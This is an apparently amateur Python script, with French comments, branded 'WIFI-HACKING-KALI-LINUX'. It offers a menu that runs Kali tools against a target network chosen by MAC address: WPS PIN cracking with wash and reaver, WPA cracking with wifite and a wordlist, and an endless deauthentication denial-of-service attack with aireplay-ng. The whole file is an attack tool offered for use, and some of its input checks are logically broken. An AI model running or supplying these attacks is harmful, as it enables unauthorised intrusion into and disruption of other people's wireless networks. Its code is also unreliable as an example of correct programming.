#importer la bibliotheque subprocess
import subprocess
#importer la bibliotheque OS
import os

#présentation
print("WIFI-HACKING-KALI-LINUX\n\n\n\n")
print('?????@????????????@??@??@@@@??@?????????')
print('??????@?????@?????@?????@???????????????')
print('???????@???@?@???@???@??@@@@??@?????????')
print('????????@?@???@ @????@??@?????@?????????')
print('?????????@?????@?????@??@?????@?????????')
print("\nACTONE_TOR && HACKINGTOOL\n")
print("********************************************")
print("*   ACTONE_TOR, 2021                       *")
print("*   TIKTOK:actone_toranonyme               *")
print("*   INSTAGRAM:Lefrentoune                  *")
print("*                                          *")
print("********************************************\n\n\n")
print("1. WPS cracking")
print("2. WPA (2) cracking")
print("3. Attaque par dénie de service(Dos)")
 
#fin présentation

#opt = � l'option choisis et input pour garde la valeur entrer  
opt = input("\nChoisisser une options :  ")
#si opt n'est pas égal a 1 il vas taper l'erreur
if not opt == str("1") and ("2") and ("3") :
    print("ERREUR: Entrer une options valide ")
#si opt = 1 il vas faire un else 'afficher la suite '

if opt == str("1"):
    os.system("clear")
    print("\n************************************************************")
    print("\n***************Bienvenue dans l'interface 1*****************")
    print("\n************************************************************\n\n\n")

   
    #if =  la commande sudo ifconfig
    
    ifc = ("sudo ifconfig")
   
    #avec subprocess nous voulons executer la commande if
   
    os.system(ifc)
   
    #inter = la réponse entrer sur la question "Entrer le nom de votre interface"
   
    inter = input("\n\nEntrer le nom de votre interface a utiliser : ")
    os.system("clear")
    #SI = la commande airmon-ng start + inter qui signifi l'interface choisis
    
    SI = ("airmon-ng start ") + inter
   
    #nous allons executer la commande SI avec subprocess
   
    os.system(SI)

    #Pour avoir l'interface wlan0mon en prioriter

    IFUP = ("ifconfig wlan0mon up")

    #executer la commande IFUP
    os.system(IFUP)
    os.system("clear")
    print("Faite Ctrl + c pour arreter la capture\n\n")
    WASH = ("wash -i wlan0mon")
    os.system("clear")
    os.system(WASH)
    
    
    #MAC = la réponse de l'adresse Mac entrer

    MAC = input("Entrer l'adresse mac du réseau cible : ")

    os.system("clear")
    os.system("reaver -i wlan0mon -b " + MAC + " -vv")



if opt == str("3"):
    os.system("clear")
    print("************************************************************")
    print("***************Bienvenue dans l'interface 3*****************")
    print("************************************************************\n")
    os.system("ifconfig")
    inter2 = input("\nEntrer le nom exacte de votre interface a utiliser : ")

    os.system("airmon-ng start " + inter2)
    os.system("clear")

    os.system("airodump-ng wlan0mon")
    mac2 = input("Entrer l'adresse mac du réseau cible : ")
    cha = input("Entrer le canal du réseau cible (CH) : ")

    os.system("clear")
    os.system("aireplay-ng -0 0 -a" + mac2 + " --ignore-negative-one wlan0mon")



if opt == str("2"):
    os.system("clear")
    print("************************************************************")
    print("***************Bienvenue dans l'interface 2*****************")
    print("************************************************************\n\n")
    print("1. Dicter la liste a utiliser")
    print("2. Utiliser la liste de base (recommander)\n\n")
    opls = input("Entrer une options valide : ")
    if not opls == str("1") and ("2"):
        print("ERREUR: Entrer une options valide")

if opls == str("1"):
    lsr = input("Entrer le nom de la liste : ")
    os.system("clear")
    os.system("wifite --dict " + lsr)

if opls == str("2"):
    os.system("clear")
    os.system("wifite --dict password.txt")
